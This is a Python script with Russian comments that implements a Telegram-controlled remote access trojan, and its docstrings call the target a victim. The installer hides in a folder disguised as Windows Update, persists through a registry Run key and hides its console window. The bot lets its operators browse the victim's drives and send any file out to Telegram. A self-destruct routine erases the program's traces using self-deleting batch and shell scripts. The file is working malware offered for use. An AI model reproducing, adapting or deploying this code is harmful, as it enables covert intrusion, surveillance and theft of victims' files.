#!/usr/bin/env python3

import os
import sys
import platform
import subprocess
import time
import urllib.request
import zipfile
import tempfile
import shutil
import threading
from datetime import datetime

# ========== КОНФИГУРАЦИЯ (ЗАМЕНИТЕ) ==========
BOT_TOKEN = " "
ADMIN_IDS = []
# ============================================

IS_WINDOWS = platform.system() == "Windows"
IS_LINUX = platform.system() == "Linux"

# ========== САМОУДАЛЕНИЕ ==========
class SelfDestruct:
    """Полное удаление себя с компьютера жертвы"""
    
    @staticmethod
    def get_install_path():
        """Получить путь установки"""
        if IS_WINDOWS:
            return os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Update')
        else:
            return os.path.expanduser("~/.cache/system-update")
    
    @staticmethod
    def remove_from_startup_windows():
        """Удаление из автозагрузки Windows"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "WindowsUpdate")
            except:
                pass
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def remove_from_startup_linux():
        """Удаление из автозагрузки Linux"""
        # Удаление из crontab
        try:
            subprocess.run('crontab -l | grep -v "system-update" | crontab -',
                          shell=True, capture_output=True)
        except:
            pass
        
        # Удаление systemd сервиса
        try:
            subprocess.run(['systemctl', '--user', 'stop', 'update.service'], capture_output=True)
            subprocess.run(['systemctl', '--user', 'disable', 'update.service'], capture_output=True)
            service_path = os.path.expanduser("~/.config/systemd/user/update.service")
            if os.path.exists(service_path):
                os.remove(service_path)
        except:
            pass
        
        # Удаление из .bashrc
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            if os.path.exists(bashrc):
                with open(bashrc, 'r') as f:
                    lines = f.readlines()
                with open(bashrc, 'w') as f:
                    for line in lines:
                        if 'system-update' not in line and 'cache/system-update' not in line:
                            f.write(line)
        except:
            pass
        
        return True
    
    @staticmethod
    def kill_processes():
        """Убить все процессы связанные с программой"""
        if IS_WINDOWS:
            try:
                subprocess.run('taskkill /f /im python.exe /fi "WINDOWTITLE eq WindowsUpdate" 2>nul',
                              shell=True, capture_output=True)
            except:
                pass
        else:
            try:
                subprocess.run('pkill -f "system-update" 2>/dev/null', shell=True, capture_output=True)
                subprocess.run('pkill -f "agent.py" 2>/dev/null', shell=True, capture_output=True)
            except:
                pass
    
    @staticmethod
    def delete_installation_folder(path):
        """Удаление папки установки"""
        try:
            if os.path.exists(path):
                # Снимаем атрибут "скрытый" если есть
                if IS_WINDOWS:
                    subprocess.run(f'attrib -h "{path}" /s /d', shell=True, capture_output=True)
                # Удаляем папку
                shutil.rmtree(path, ignore_errors=True)
            return True
        except:
            # Если не удалось, создаём bat/script для отложенного удаления
            if IS_WINDOWS:
                bat_path = os.path.join(tempfile.gettempdir(), "self_del.bat")
                with open(bat_path, 'w') as f:
                    f.write(f"""@echo off
timeout /t 2 /nobreak >nul
rmdir /s /q "{path}"
del "%~f0"
""")
                subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                script_path = "/tmp/self_del.sh"
                with open(script_path, 'w') as f:
                    f.write(f"""#!/bin/bash
sleep 2
rm -rf "{path}"
rm -f "$0"
""")
                os.chmod(script_path, 0o755)
                subprocess.Popen([script_path], shell=True)
            return True
    
    @staticmethod
    def delete_self_exe():
        """Удалить сам .exe файл (если запущен из временной папки)"""
        try:
            current = os.path.abspath(sys.argv[0])
            if IS_WINDOWS:
                # Создаём bat для удаления текущего файла
                bat_path = os.path.join(tempfile.gettempdir(), "del_exe.bat")
                with open(bat_path, 'w') as f:
                    f.write(f"""@echo off
timeout /t 1 /nobreak >nul
del /f /q "{current}"
del "%~f0"
""")
                subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                os.remove(current)
        except:
            pass
    
    @classmethod
    def full_uninstall(cls):
        """ПОЛНОЕ УДАЛЕНИЕ ВСЕГО"""
        print("[*] Начинаем полное удаление...")
        
        # 1. Убиваем процессы
        cls.kill_processes()
        
        # 2. Удаляем из автозагрузки
        if IS_WINDOWS:
            cls.remove_from_startup_windows()
        else:
            cls.remove_from_startup_linux()
        
        # 3. Удаляем папку установки
        install_path = cls.get_install_path()
        cls.delete_installation_folder(install_path)
        
        # 4. Удаляем .exe (текущий файл)
        cls.delete_self_exe()
        
        # 5. Завершаем программу
        print("[✓] Удаление завершено")
        sys.exit(0)


# ========== УСТАНОВЩИК ==========
class SelfInstaller:
    def __init__(self):
        self.base_dir = None
        self.venv_python = None
    
    def get_install_path(self):
        if IS_WINDOWS:
            base = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Update')
            os.makedirs(base, exist_ok=True)
            subprocess.run(f'attrib +h "{base}"', shell=True, capture_output=True)
            return base
        else:
            base = os.path.expanduser("~/.cache/system-update")
            os.makedirs(base, exist_ok=True)
            return base
    
    def is_python_installed(self):
        try:
            subprocess.run(['python', '--version'], capture_output=True, timeout=5)
            return True
        except:
            try:
                subprocess.run(['python3', '--version'], capture_output=True, timeout=5)
                return True
            except:
                return False
    
    def install_python_windows(self):
        print("[*] Установка Python...")
        temp_dir = tempfile.gettempdir()
        python_url = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
        zip_path = os.path.join(temp_dir, "python.zip")
        
        try:
            urllib.request.urlretrieve(python_url, zip_path)
            python_dir = os.path.join(self.base_dir, "python")
            os.makedirs(python_dir, exist_ok=True)
            with zipfile.ZipFile(zip_path, 'r') as zf:
                zf.extractall(python_dir)
            
            pth_file = os.path.join(python_dir, "python._pth")
            with open(pth_file, 'w') as f:
                f.write(f"""python{os.sep}Lib{os.sep}site-packages
import site
""")
            os.remove(zip_path)
            return os.path.join(python_dir, "python.exe")
        except:
            return None
    
    def install_telebot(self, python_exe):
        print("[*] Установка telebot...")
        try:
            # Скачиваем get-pip.py
            get_pip = os.path.join(tempfile.gettempdir(), "get-pip.py")
            urllib.request.urlretrieve("https://bootstrap.pypa.io/get-pip.py", get_pip)
            subprocess.run([python_exe, get_pip, '--quiet'], capture_output=True, timeout=30)
            os.remove(get_pip)
            
            # Устанавливаем библиотеки
            subprocess.run([python_exe, '-m', 'pip', 'install', 'telebot', 'requests', '--quiet'],
                          capture_output=True, timeout=120)
            return True
        except:
            return False
    
    def copy_script(self):
        current = os.path.abspath(sys.argv[0])
        dest = os.path.join(self.base_dir, "agent.py")
        with open(current, 'rb') as src:
            with open(dest, 'wb') as dst:
                dst.write(src.read())
        return dest
    
    def create_launcher(self, python_exe, script_path):
        if IS_WINDOWS:
            bat_path = os.path.join(self.base_dir, "start.bat")
            with open(bat_path, 'w') as f:
                f.write(f"""@echo off
{python_exe} "{script_path}" --installed > nul 2>&1
""")
            return bat_path
        else:
            return script_path
    
    def add_to_startup_windows(self, launcher_path):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, launcher_path)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def run_installed_script(self, python_exe, script_path):
        if IS_WINDOWS:
            subprocess.Popen([python_exe, script_path, "--installed"],
                           creationflags=subprocess.CREATE_NO_WINDOW,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.Popen([python_exe, script_path, "--installed"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    def install(self):
        print("[*] Установка...")
        self.base_dir = self.get_install_path()
        
        flag_file = os.path.join(self.base_dir, "installed.flag")
        if os.path.exists(flag_file):
            print("[*] Уже установлено")
            return True
        
        script_path = self.copy_script()
        print("[✓] Скрипт скопирован")
        
        if IS_WINDOWS:
            python_exe = self.install_python_windows()
            if python_exe and os.path.exists(python_exe):
                self.install_telebot(python_exe)
            else:
                python_exe = "python"
        else:
            python_exe = "python3"
        
        launcher = self.create_launcher(python_exe, script_path)
        
        if IS_WINDOWS:
            self.add_to_startup_windows(launcher)
        
        with open(flag_file, 'w') as f:
            f.write(datetime.now().isoformat())
        
        self.run_installed_script(python_exe, script_path)
        print("[✓] Установка завершена")
        return True


# ========== ОСНОВНОЙ БОТ С УДАЛЕНИЕМ ==========
class FileManager:
    def __init__(self):
        self.bot = None
    
    def hide_console(self):
        if IS_WINDOWS:
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    
    def start_bot(self):
        try:
            import telebot
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            
            self.bot = telebot.TeleBot(BOT_TOKEN)
            
            @self.bot.message_handler(commands=['start'])
            def start_cmd(message):
                if message.from_user.id not in ADMIN_IDS:
                    self.bot.reply_to(message, "❌ Неавторизован")
                    return
                
                markup = InlineKeyboardMarkup(row_width=2)
                markup.add(
                    InlineKeyboardButton("💻 C:", callback_data="drive_C:"),
                    InlineKeyboardButton("📁 Ручной ввод", callback_data="manual"),
                    InlineKeyboardButton("🗑️ ПОЛНОЕ УДАЛЕНИЕ", callback_data="self_destruct")
                )
                if IS_WINDOWS:
                    markup.add(InlineKeyboardButton("💾 D:", callback_data="drive_D:"))
                
                self.bot.send_message(message.chat.id,
                    f"📁 **Файловый менеджер**\n🖥️ {platform.node()}\n👤 {os.getlogin()}\n\n⚠️ Кнопка удаления уничтожит программу на этом ПК",
                    reply_markup=markup, parse_mode='Markdown')
            
            @self.bot.callback_query_handler(func=lambda call: True)
            def handle(call):
                if call.from_user.id not in ADMIN_IDS:
                    self.bot.answer_callback_query(call.id, "Неавторизован")
                    return
                
                data = call.data
                
                # ===== КНОПКА ПОЛНОГО УДАЛЕНИЯ =====
                if data == "self_destruct":
                    # Спрашиваем подтверждение
                    confirm_markup = InlineKeyboardMarkup()
                    confirm_markup.add(
                        InlineKeyboardButton("✅ ДА, УДАЛИТЬ ВСЁ", callback_data="confirm_destruct"),
                        InlineKeyboardButton("❌ ОТМЕНА", callback_data="cancel_destruct")
                    )
                    self.bot.edit_message_text(
                        "⚠️ **ПОДТВЕРЖДЕНИЕ УДАЛЕНИЯ** ⚠️\n\n"
                        "Это действие:\n"
                        "• Удалит программу с этого компьютера\n"
                        "• Удалит из автозагрузки\n"
                        "• Удалит все файлы и папки\n"
                        "• Программа больше не запустится\n\n"
                        "**Вы уверены?**",
                        call.message.chat.id,
                        call.message.message_id,
                        reply_markup=confirm_markup,
                        parse_mode='Markdown'
                    )
                
                elif data == "confirm_destruct":
                    self.bot.edit_message_text(
                        "🗑️ **УДАЛЕНИЕ НАЧАТО...**\n\n"
                        "Программа будет полностью удалена с этого компьютера.\n"
                        "Бот перестанет отвечать в течение нескольких секунд.",
                        call.message.chat.id,
                        call.message.message_id,
                        parse_mode='Markdown'
                    )
                    
                    # Запускаем удаление в отдельном потоке
                    def uninstall_thread():
                        time.sleep(2)
                        SelfDestruct.full_uninstall()
                    
                    threading.Thread(target=uninstall_thread, daemon=True).start()
                
                elif data == "cancel_destruct":
                    self.bot.edit_message_text(
                        "✅ Удаление отменено",
                        call.message.chat.id,
                        call.message.message_id,
                        parse_mode='Markdown'
                    )
                    start_cmd(call.message)
                
                # Обычные команды навигации
                elif data.startswith("drive_"):
                    path = data[6:] + "\\"
                    self.show_folder(call.message, path)
                
                elif data == "manual":
                    self.bot.edit_message_text(
                        "📝 Введите путь:\n`C:\\Users\\` или `/home/user/`",
                        call.message.chat.id, call.message.message_id, parse_mode='Markdown')
                    self.bot.register_next_step_handler(call.message, self.handle_path)
                
                elif data.startswith("open_"):
                    path = data[5:]
                    if os.path.isdir(path):
                        self.show_folder(call.message, path)
                    else:
                        self.send_file(call.message.chat.id, path)
                
                elif data.startswith("ls_"):
                    self.show_folder(call.message, data[3:])
                
                self.bot.answer_callback_query(call.id)
            
            @self.bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
            def handle_path(message):
                path = message.text.strip()
                if path.lower() == "self_destruct":
                    # Альтернативный вызов удаления через текст
                    confirm_markup = InlineKeyboardMarkup()
                    confirm_markup.add(
                        InlineKeyboardButton("✅ ДА, УДАЛИТЬ", callback_data="confirm_destruct"),
                        InlineKeyboardButton("❌ ОТМЕНА", callback_data="cancel_destruct")
                    )
                    self.bot.reply_to(message, "⚠️ Подтвердите удаление:", reply_markup=confirm_markup)
                elif os.path.exists(path):
                    if os.path.isdir(path):
                        self.show_folder(message, path)
                    else:
                        self.send_file(message.chat.id, path)
                else:
                    self.bot.reply_to(message, f"❌ Не существует: {path}")
            
            print("[✓] Бот запущен")
            self.bot.infinity_polling()
            
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(10)
    
    def show_folder(self, message, path):
        try:
            if not os.path.exists(path) or not os.path.isdir(path):
                self.bot.edit_message_text(f"❌ Путь не найден: {path}", 
                    message.chat.id, message.message_id)
                return
            
            items = []
            for item in os.listdir(path)[:50]:
                full = os.path.join(path, item)
                typ = "📁" if os.path.isdir(full) else "📄"
                size = ""
                if os.path.isfile(full):
                    sz = os.path.getsize(full)
                    for unit in ['B','KB','MB','GB']:
                        if sz < 1024:
                            size = f" ({sz:.1f}{unit})"
                            break
                        sz /= 1024
                items.append(f"{typ} {item}{size}")
            
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            markup = InlineKeyboardMarkup(row_width=1)
            markup.add(InlineKeyboardButton("⬆️ Наверх", callback_data=f"ls_{os.path.dirname(path)}"))
            
            for item in items[:20]:
                full_path = os.path.join(path, item[2:].split(' (')[0])
                markup.add(InlineKeyboardButton(item[:50], callback_data=f"open_{full_path}"))
            
            markup.add(InlineKeyboardButton("🏠 Главное меню", callback_data="main"))
            markup.add(InlineKeyboardButton("🗑️ УДАЛИТЬ ВСЁ", callback_data="self_destruct"))
            
            self.bot.edit_message_text(f"📂 **{path}**\n📁 Всего: {len(items)}", 
                message.chat.id, message.message_id, reply_markup=markup, parse_mode='Markdown')
        except Exception as e:
            self.bot.edit_message_text(f"❌ Ошибка: {e}", message.chat.id, message.message_id)
    
    def send_file(self, chat_id, file_path):
        try:
            import requests
            if os.path.getsize(file_path) > 50 * 1024 * 1024:
                self.bot.send_message(chat_id, "❌ Файл > 50MB")
                return
            with open(file_path, 'rb') as f:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                             data={"chat_id": chat_id}, files={"document": f}, timeout=30)
        except:
            pass
    
    def run(self):
        self.hide_console()
        time.sleep(2)
        self.start_bot()


# ========== ТОЧКА ВХОДА ==========
if __name__ == "__main__":
    # Проверяем, нужно ли устанавливаться
    if len(sys.argv) > 1 and sys.argv[1] == "--installed":
        fm = FileManager()
        fm.run()
    else:
        # Первый запуск — установка
        installer = SelfInstaller()
        installer.install()
        
        # Завершаем установщик
        time.sleep(2)
        sys.exit(0)
